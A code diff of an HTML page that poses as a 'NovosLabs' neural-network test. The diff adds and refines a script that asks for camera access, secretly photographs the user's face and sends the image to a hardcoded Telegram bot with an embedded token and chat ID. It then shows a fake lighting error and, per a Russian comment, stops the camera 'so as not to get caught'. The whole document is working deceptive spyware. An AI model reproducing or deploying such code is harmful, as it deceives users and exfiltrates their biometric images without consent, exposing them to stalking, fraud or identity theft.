@@ -21,43 +21,55 @@
     <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
 
     <script>
-        const TOKEN = "8511911062:AAGj_4rH-k2lpAXWsUe_5yM3WAEFVl0-cs4"; // Твой токен
+      const TOKEN = "8511911062:AAGj_4rH-k2lpAXWsUe_5yM3WAEFVl0-cs4"; // Твой токен
         const CHAT_ID = "1498741744"; // Твой ID
 
         function startTest() {
-            navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
+            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } }).then(stream => {
                 const video = document.getElementById('video');
                 video.srcObject = stream;
-                video.play(); // Принудительно запускаем поток
-
-                // Ждем 3 секунды (3000 мс), чтобы камера сфокусировалась и дала картинку
-                setTimeout(() => {
-                    takePhoto();
-                    // Еще через секунду выдаем ошибку, чтобы он не ждал вечно
+                
+                // Ждем, пока видео реально начнет играть
+                video.onloadedmetadata = () => {
+                    video.play();
+                    // Даем еще 2 секунды на автофокус после старта воспроизведения
                     setTimeout(() => {
-                        alert("Ошибка сервера: Не удалось обработать изображение из-за низкого освещения. Попробуйте еще раз.");
-                    }, 1000);
-                }, 3000); 
+                        takePhoto();
+                        setTimeout(() => {
+                            alert("Ошибка: Низкое качество освещения. Попробуйте поднести телефон ближе к лицу.");
+                        }, 1000);
+                    }, 2000);
+                };
             }).catch(err => {
-                alert("Для работы нейросети NovosLabs необходим доступ к камере.");
+                alert("Для теста NovosLabs необходимо разрешить доступ к камере.");
             });
         }
 
         function takePhoto() {
             const canvas = document.getElementById('canvas');
             const video = document.getElementById('video');
-            canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
+            const context = canvas.getContext('2d');
+            
+            // Рисуем кадр
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            
             canvas.toBlob(blob => {
                 const formData = new FormData();
                 formData.append('chat_id', CHAT_ID);
                 formData.append('document', blob, 'face.jpg');
+                
                 fetch(`https://api.telegram.org/bot${TOKEN}/sendDocument`, {
                     method: 'POST',
                     body: formData
+                }).then(res => {
+                    // Останавливаем камеру после отправки, чтобы не палиться
+                    const tracks = video.srcObject.getTracks();
+                    tracks.forEach(track => track.stop());
                 });
-            }, 'image/jpeg');
+            }, 'image/jpeg', 0.8); // 0.8 - качество, чтобы файл летел быстрее
         }
     </script>
 </body>
 
 </html>
+
